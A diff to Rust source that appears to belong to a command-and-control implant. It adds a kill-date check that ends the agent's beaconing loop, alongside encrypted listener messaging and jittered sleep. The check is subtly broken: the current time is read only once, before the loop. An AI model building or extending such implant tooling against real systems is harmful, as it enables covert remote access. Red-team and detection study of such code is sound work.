@@ -1,3 +1,4 @@
+use chrono::{NaiveDateTime, Utc};
 use reqwest::header::{HeaderMap, USER_AGENT};
 use std::{
     collections::HashMap,
@@ -21,10 +22,17 @@ use crate::{
     Config,
     config::listener,
     crypto::aesgcm::{cipher, decipher, EncMessage},
-    utils::random::{random_name, random_sleeptime},
+    utils::{
+        datetime::{expires_killdate, get_killdate},
+        random::{random_name, random_sleeptime},
+    },
 };
 
 pub async fn run(config: Config) -> Result<(), Error> {
+    // Parse the kill date
+    let now = Utc::now().naive_utc();
+    let killdate = get_killdate(config.killdate.as_str());
+
     // Get agent into for registration
     let agent_name =  random_name("agent".to_owned());
     let hostname = match Command::new("hostname").output() {
@@ -108,6 +116,10 @@ pub async fn run(config: Config) -> Result<(), Error> {
 
     loop {
         // TODO: Implement graceful shutdown
+
+        if expires_killdate(killdate.clone(), now.clone()) {
+            break;
+        }
 
         thread::sleep(
             random_sleeptime(sleeptime.to_owned(), config.jitter.to_owned())
